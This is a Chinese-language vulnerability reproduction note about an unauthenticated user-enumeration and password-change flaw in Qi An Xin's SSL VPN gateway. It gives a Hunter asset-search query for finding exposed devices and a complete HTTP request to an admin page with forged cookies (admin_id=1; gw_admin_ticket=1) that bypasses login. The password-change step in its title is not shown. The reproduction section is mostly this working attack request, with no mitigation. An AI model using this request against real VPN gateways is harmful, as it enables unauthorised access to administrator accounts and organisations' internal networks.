# 奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞

# 一、漏洞简介
<font style="color:rgb(23, 46, 77);">奇安信安全接入网关系统（SSL VPN）在满足客户的身份安全、传输加密、访问授权等多种安全需求基础上，针对 BYOD 及 CYOD 等移动办公场景，提供统一的安全办公接入入口、门户式单点登录、应用 APP安全加固、移动应用数据安全，从而为客户提供“一站式”安全移动办公解决方案。奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞。</font>

# 二、影响版本
+ 奇安信VPN

# 三、资产测绘
+ hunter`app.name="奇安信 VPN"`
+ 特征

![1698460379128-d226d33b-a8e8-4d70-b6e8-c17676d964c7.png](./img/IlJ3sRJ1ekzuj2bY/1698460379128-d226d33b-a8e8-4d70-b6e8-c17676d964c7-328271.png)

# 四、漏洞复现
用户遍历

修改`cookie：admin_id=1; gw_admin_ticket=1;`访问出现如下页面表示存在漏洞

```plain
GET /admin/group/x_group.php?id=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: admin_id=1; gw_admin_ticket=1;
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

![1698460517620-2321d0c0-3c69-4610-89df-b5c0a420d5f4.png](./img/IlJ3sRJ1ekzuj2bY/1698460517620-2321d0c0-3c69-4610-89df-b5c0a420d5f4-766217.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/liitlbcoprgaf65r>